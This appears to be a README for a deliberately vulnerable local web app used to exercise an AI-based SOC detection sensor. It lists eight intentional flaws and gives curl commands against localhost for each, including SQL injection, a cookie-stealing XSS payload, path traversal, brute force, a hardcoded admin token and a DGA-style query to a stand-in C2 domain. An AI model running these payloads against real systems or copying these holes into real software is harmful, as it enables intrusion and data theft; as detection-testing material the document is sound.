# ApexGov Gateway — Penetration Testing Vulnerabilities & SOC Detection

Target host: `http://localhost:5000`  
Sensor enclave: `http://localhost:8000` (ZERO-DAY Dual-Layer AI)  
SOC Dashboard: `http://localhost:5173/#/alerts`  
Database: `data/alerts.db` (`alerts` + `http_logs` tables)

---

## Vulnerabilities Catalog

| ID | Vulnerability | Endpoint | Method | Exploit Technique | SIH Threat Class Flagged |
|---|---|---|---|---|---|
| **V1** | **Unthrottled Login Brute-Force** | `/api/login` | `POST` | High-frequency password guessing without lockout | **Volumetric / Protocol DDoS** |
| **V2** | **SQL Injection (Dump All TXs)** | `/api/transactions?acct=` | `GET` | String concat `' OR 1=1--` dumps entire table | **Data Exfiltration** |
| **V3** | **Reflected Cross-Site Scripting (XSS)** | `/search?q=` | `GET` | Echoes `<script>alert(1)</script>` unescaped | **(Logged in DB)** + C2 Pattern |
| **V4** | **Open DNS Resolver (DGA Probe)** | `/api/dns-lookup?host=` | `GET` | High-entropy algorithmic subdomain queries | **DGA / DNS Tunnelling** |
| **V5** | **Path Traversal & Unrestricted Upload** | `/api/upload` | `POST` | Filename `../../etc/exfil.db` with high body volume | **Data Exfiltration** |
| **V6** | **Weak TLS / Legacy Cipher Acceptance** | `/api/vault` | `GET` | Obsolete cipher negotiation / malformed ClientHello | **Malicious Encrypted Sessions** |
| **V7** | **Static Admin Session Token (Heartbeat)** | `/api/admin/status?token=` | `GET` | Constant beacon using static `admin_2024_secret` | **Botnet C2 Beaconing** |
| **V8** | **Multi-Port Reconnaissance Probing** | `/api/probe/{port}` | `GET` | Mass port reachability enumeration | **Reconnaissance / Port Scanning** |

---

## How to Perform Attacks

### 1. One-Click Pentest Console (Easiest)
1. Open **`http://localhost:5000`** in Chrome.
2. The **Red Team Pentest Console** on the right has buttons for all 8 vulnerabilities.
3. Click any button (e.g. **💉 SQL Injection** or **🔑 Login Brute-Force**).
4. Watch the live request appear in the **Live Request Log** table (persisted to SQLite).
5. Switch to **`http://localhost:5173/#/alerts`** to see ZERO-DAY detect it live.

---

### 2. Manual CLI / Terminal Exploits (Real Network Traffic)

#### V1: Login Brute-Force
```bash
for i in {1..30}; do
  curl -s -X POST http://localhost:5000/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"guess$i\"}"
done
```

#### V2: SQL Injection
```bash
curl -s "http://localhost:5000/api/transactions?acct=%27%20OR%201%3D1--"
```

#### V3: Reflected XSS
```bash
curl -s "http://localhost:5000/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E"
```

#### V4: High-Entropy DNS / DGA
```bash
curl -s "http://localhost:5000/api/dns-lookup?host=a8f93c01b2d3e4f5a6b7.exfil-c2.net"
```

#### V5: Path Traversal
```bash
curl -s -X POST http://localhost:5000/api/upload \
  -d "filename=../../etc/exfil.db&content=SENSITIVE_TREASURY_RECORDS"
```

#### V6: Weak TLS Probe
```bash
curl -s http://localhost:5000/api/vault -H "User-Agent: legacy-ssl3-client"
```

#### V7: Admin Beacon Heartbeat
```bash
for i in {1..10}; do
  curl -s "http://localhost:5000/api/admin/status?token=admin_2024_secret"
  sleep 1
done
```

#### V8: Multi-Port Scan
```bash
for port in 21 22 80 443 3306 5000 8000; do
  curl -s "http://localhost:5000/api/probe/port_$port"
done
```

---

## Verifying in SQLite
View the persisted HTTP request logs and forensic alerts:
```bash
sqlite3 data/alerts.db "SELECT timestamp, method, path, status_code, flagged FROM http_logs ORDER BY log_id DESC LIMIT 10;"
sqlite3 data/alerts.db "SELECT timestamp, threat_class, severity, confidence, status FROM alerts ORDER BY timestamp DESC LIMIT 10;"
```
